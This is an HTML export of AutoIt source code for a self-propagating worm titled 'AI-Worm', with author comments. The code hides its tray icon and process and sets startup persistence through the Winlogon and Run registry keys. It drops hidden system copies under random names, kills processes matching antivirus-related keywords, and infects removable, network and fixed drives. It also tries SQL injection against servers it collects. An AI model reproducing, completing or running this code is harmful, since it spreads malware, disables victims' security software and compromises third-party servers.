<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc3 {
	color: #FF8000;
}
.sc4 {
	color: #8000FF;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #8000FF;
}
.sc7 {
	color: #808080;
}
.sc8 {
	font-weight: bold;
	color: #000080;
}
.sc9 {
	font-style: italic;
	color: #FF0080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;AI-Worm(C) by Mr`Anderson/doomriderz</span><span class="sc0">
</span><span class="sc1">;There's no patch for stupidity</span><span class="sc0">
</span><span class="sc1">;I think that to exploit men's mind is better than to exploit programs ;&gt;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc6">@Compiled</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
Opt</span><span class="sc8">(</span><span class="sc7">"TrayAutoPause"</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc1">;can't pause the script by clicking on the tray icon</span><span class="sc0">
</span><span class="sc4">Break</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc1">;same</span><span class="sc0">
Opt</span><span class="sc8">(</span><span class="sc7">"TrayIconDebug"</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0">
Opt</span><span class="sc8">(</span><span class="sc7">"TrayIconHide"</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc1">;hide tray icon</span><span class="sc0">
Opt</span><span class="sc8">(</span><span class="sc7">"RunErrorsFatal"</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc1">;don't display fatal errors when running external programs</span><span class="sc0">
FixReg</span><span class="sc8">()</span><span class="sc1">;fix the registry</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$globalServerList</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$globalCheckedSrvLst</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sSessionLinks</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$sOldLinks</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$sSQLInjectionQuery</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$sXpLinks</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$tftp_name</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$sVectors</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@ScriptName</span><span class="sc1">;current copy name</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$copy_path</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> @AutoItExe</span><span class="sc1">;current copy path (complete path+name)</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$reg_key</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span class="sc1">;startup key</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$reg_val</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"Explorer.exe "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" silent"</span><span class="sc1">;startup key val</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">13</span><span class="sc8">]</span><span class="sc1">;list of words to filter processes</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"anti"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"vir"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">2</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"fix"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"remov"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">4</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"upd"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">5</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"ack"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">6</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"protect"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">7</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"secur"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">8</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"proc"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">9</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"av"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">10</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"mgr"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">11</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"reg"</span><span class="sc0">
</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc3">12</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"troj"</span><span class="sc0">

</span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@OSTYPE</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"WIN32_NT"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if running under win nt</span><span class="sc0">
    </span><span class="sc9">$check_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc4">RegRead</span><span class="sc8">(</span><span class="sc9">$reg_key</span><span class="sc8">,</span><span class="sc7">"Shell"</span><span class="sc8">))</span><span class="sc1">;read the startup key</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$check_name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if the key is empty or doesn't exist</span><span class="sc0">
        </span><span class="sc9">$reg_key</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc1">;change startup method</span><span class="sc0">
        </span><span class="sc9">$reg_val</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$copy_path</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" silent"</span><span class="sc1">;fit the key val to the new startup method</span><span class="sc0">
        </span><span class="sc9">$check_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc4">RegRead</span><span class="sc8">(</span><span class="sc9">$reg_key</span><span class="sc8">,</span><span class="sc7">"Shell"</span><span class="sc8">))</span><span class="sc1">;get the val if already there</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">Else</span><span class="sc1">;if not running under win nt</span><span class="sc0">
    </span><span class="sc9">$reg_key</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc1">;use system.ini startup method</span><span class="sc0">
    </span><span class="sc9">$check_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc4">IniRead</span><span class="sc8">(</span><span class="sc6">@WindowsDir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\System.ini"</span><span class="sc8">,</span><span class="sc7">"boot"</span><span class="sc8">,</span><span class="sc7">"shell"</span><span class="sc8">,</span><span class="sc7">""</span><span class="sc8">))</span><span class="sc1">;check the ini</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">

</span><span class="sc5">If</span><span class="sc0"> </span><span class="sc9">$CmdLine</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc9">$CmdLine</span><span class="sc8">[</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"silent"</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if running with 1 parameter and the parameter is "silent" the we are installed and ready to spread</span><span class="sc0">
    TCPStartup</span><span class="sc8">()</span><span class="sc0">
    SetStartup</span><span class="sc8">()</span><span class="sc1">;set startup method in order to run every time win starts</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@OSTYPE</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"WIN32_WINDOWS"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc1">;if running under win98/me</span><span class="sc0">
        DllCall</span><span class="sc8">(</span><span class="sc7">"kernel32.dll"</span><span class="sc8">,</span><span class="sc7">"dword"</span><span class="sc8">,</span><span class="sc7">"RegisterServiceProcess"</span><span class="sc8">,</span><span class="sc7">"dword"</span><span class="sc8">,</span><span class="sc0">@AutoItPID</span><span class="sc8">,</span><span class="sc7">"dword"</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc1">;call kernel's RegServProc in order to hide our process</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    IterateThroughDrives</span><span class="sc8">(</span><span class="sc7">"ALL"</span><span class="sc8">)</span><span class="sc1">;go through all drives</span><span class="sc0">
    </span><span class="sc5">While</span><span class="sc0"> True</span><span class="sc1">;our loop</span><span class="sc0">
        SetStartup</span><span class="sc8">()</span><span class="sc1">;keep writing the registry or the ini file</span><span class="sc0">
        FixReg</span><span class="sc8">()</span><span class="sc1">;keep fixing the registry</span><span class="sc0">
        EndBadProcs</span><span class="sc8">()</span><span class="sc1">;keep ending bad precesses</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@SEC</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;</span><span class="sc3">0.2</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;every minute with 1/5 prob, </span><span class="sc0">
            IterateThroughDrives</span><span class="sc8">(</span><span class="sc7">"REMOVABLE"</span><span class="sc8">)</span><span class="sc1">;check rem drives to infect</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@MIN</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;every hour,</span><span class="sc0">
            IterateThroughDrives</span><span class="sc8">(</span><span class="sc7">"NETWORK"</span><span class="sc8">)</span><span class="sc1">;check net drives to infect</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@MIN</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;</span><span class="sc3">0.5</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;every hour with 1/2 prob,</span><span class="sc0">
            IterateThroughDrives</span><span class="sc8">(</span><span class="sc7">"FIXED"</span><span class="sc8">)</span><span class="sc1">;check fixed drives to infect</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@IPAddress1</span><span class="sc8">&lt;&gt;</span><span class="sc7">"127.0.0.1"</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc1">; if a connection is available</span><span class="sc0">
            </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$gsl</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$globalServerList</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc1">;split the global server list</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$gsl</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if it is not empty</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$nextserver</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">$gsl</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc1">;go through it</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$gsl</span><span class="sc8">[</span><span class="sc9">$s</span><span class="sc8">]&lt;&gt;</span><span class="sc7">""</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;and find the first server</span><span class="sc0">
                        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$urlpart</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$gsl</span><span class="sc8">[</span><span class="sc9">$s</span><span class="sc8">],</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> TCPNameToIP</span><span class="sc8">(</span><span class="sc9">$urlpart</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">])&lt;&gt;</span><span class="sc6">@IPAddress1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if it doesn't match our same ip</span><span class="sc0">
                            </span><span class="sc9">$nextserver</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$gsl</span><span class="sc8">[</span><span class="sc9">$s</span><span class="sc8">]</span><span class="sc1">;select it</span><span class="sc0">
                            </span><span class="sc5">ExitLoop</span><span class="sc1">;exit the loop</span><span class="sc0">
                        </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">Next</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$nextserver</span><span class="sc8">&lt;&gt;</span><span class="sc7">""</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if a valid server was found</span><span class="sc0">
                    Hax</span><span class="sc8">(</span><span class="sc9">$nextserver</span><span class="sc8">,</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc1">;try to hax it with sql injection!</span><span class="sc0">
                    </span><span class="sc9">$globalServerList</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringreplace</span><span class="sc8">(</span><span class="sc9">$globalServerList</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$nextserver</span><span class="sc8">,</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc1">;delete this server from the list</span><span class="sc0">
                    </span><span class="sc9">$globalCheckedSrvLst</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$nextserver</span><span class="sc1">;add the server to a list of checked ones</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">Endif</span><span class="sc0">
    </span><span class="sc5">WEnd</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">

</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$vir_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> RunHost</span><span class="sc8">()</span><span class="sc1">;run the host if the worm is being run from an infected file</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$show_err_msg</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> True</span><span class="sc1">;show fake error msg on exit</span><span class="sc0">
</span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$vir_body</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if not running from and infected file</span><span class="sc0">
    </span><span class="sc9">$vir_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc0">@AutoItExe</span><span class="sc8">)</span><span class="sc1">;read ourselves</span><span class="sc0">
</span><span class="sc5">Else</span><span class="sc1">;if ran from inf file,</span><span class="sc0">
    </span><span class="sc9">$show_err_msg</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> False</span><span class="sc1">;do not show the fake err</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">   

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$check_name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc9">$check_name</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">"explorer.exe"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;check if we are already installed or not</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$offs</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">14</span><span class="sc1">;len of explorer.exe and a white space, + 1</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$check_name</span><span class="sc8">,</span><span class="sc3">12</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"explorer.exe"</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$offs</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc1">;if we are using the 2nd method to track the sys, zero the offset</span><span class="sc0">
    </span><span class="sc9">$check_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$check_name</span><span class="sc8">,</span><span class="sc9">$offs</span><span class="sc8">,</span><span class="sc3">10</span><span class="sc8">)</span><span class="sc1">;get the name of the installed worm if present</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$check_name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> Quit</span><span class="sc8">(</span><span class="sc9">$show_err_msg</span><span class="sc8">)</span><span class="sc1">;if it exists, quit</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc4">ProcessSetPriority</span><span class="sc8">(</span><span class="sc0">@AutoItPID</span><span class="sc8">,</span><span class="sc3">4</span><span class="sc8">)</span><span class="sc1">;start going resident by setting our proc's priority to high, so we can do it faster</span><span class="sc0">
</span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc1">;reset copy name</span><span class="sc0">
</span><span class="sc5">While</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc1">;while a valid copy name hasn't been rendomized, do</span><span class="sc0">
    </span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">Chr</span><span class="sc8">(</span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">97</span><span class="sc8">,</span><span class="sc3">122</span><span class="sc8">)))</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">".exe"</span><span class="sc1">;six random chars and .exe extension</span><span class="sc0">
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$p</span><span class="sc8">=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc4">UBound</span><span class="sc8">(</span><span class="sc9">$bad_procs</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc1">;go through bad procs names</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$copy_name</span><span class="sc8">),</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc9">$p</span><span class="sc8">]))&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if the random name matches a filter,</span><span class="sc0">
            </span><span class="sc9">$copy_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc1">;reset the copy name</span><span class="sc0">
            </span><span class="sc5">ExitLoop</span><span class="sc1">;exit loop (randomize another name)</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc5">WEnd</span><span class="sc0">
</span><span class="sc9">$tmp_path</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@TempDir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\~"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$copy_name</span><span class="sc1">;build a temp path</span><span class="sc0">
</span><span class="sc4">FileWrite</span><span class="sc8">(</span><span class="sc9">$tmp_path</span><span class="sc8">,</span><span class="sc9">$vir_body</span><span class="sc8">)</span><span class="sc1">;write there our body</span><span class="sc0">
</span><span class="sc9">$copy_path</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@SystemDir</span><span class="sc8">&amp;</span><span class="sc7">"\"</span><span class="sc8">&amp;</span><span class="sc9">$copy_name</span><span class="sc1">;build the copy path</span><span class="sc0">
</span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$copy_path</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;check if the file already exists</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">ProcessExists</span><span class="sc8">(</span><span class="sc9">$copy_name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if it is being run,</span><span class="sc0">
        </span><span class="sc4">ProcessClose</span><span class="sc8">(</span><span class="sc9">$copy_name</span><span class="sc8">)</span><span class="sc1">;close the process</span><span class="sc0">
        </span><span class="sc4">Sleep</span><span class="sc8">(</span><span class="sc3">2000</span><span class="sc8">)</span><span class="sc1">;sleep 2 secs till the process shuts down</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc4">FileSetAttrib</span><span class="sc8">(</span><span class="sc9">$copy_path</span><span class="sc8">,</span><span class="sc7">"-HSR"</span><span class="sc8">)</span><span class="sc1">;reset the attribs</span><span class="sc0">
    </span><span class="sc4">FileDelete</span><span class="sc8">(</span><span class="sc9">$copy_path</span><span class="sc8">)</span><span class="sc1">;delete it!</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc4">FileCopy</span><span class="sc8">(</span><span class="sc9">$tmp_path</span><span class="sc8">,</span><span class="sc9">$copy_path</span><span class="sc8">)</span><span class="sc1">;copy our temp copy to that location</span><span class="sc0">
</span><span class="sc4">FileSetAttrib</span><span class="sc8">(</span><span class="sc9">$copy_path</span><span class="sc8">,</span><span class="sc7">"+HSR"</span><span class="sc8">)</span><span class="sc1">;set hidden,system,read only attribs</span><span class="sc0">
</span><span class="sc4">FileDelete</span><span class="sc8">(</span><span class="sc9">$tmp_path</span><span class="sc8">)</span><span class="sc1">;delete temp copy</span><span class="sc0">
</span><span class="sc4">Run</span><span class="sc8">(</span><span class="sc9">$copy_path</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" silent"</span><span class="sc8">,</span><span class="sc6">@SystemDir</span><span class="sc8">)</span><span class="sc1">;run the copy with the "silent" parameter</span><span class="sc0">
Quit</span><span class="sc8">(</span><span class="sc9">$show_err_msg</span><span class="sc8">)</span><span class="sc1">;quit</span><span class="sc0">

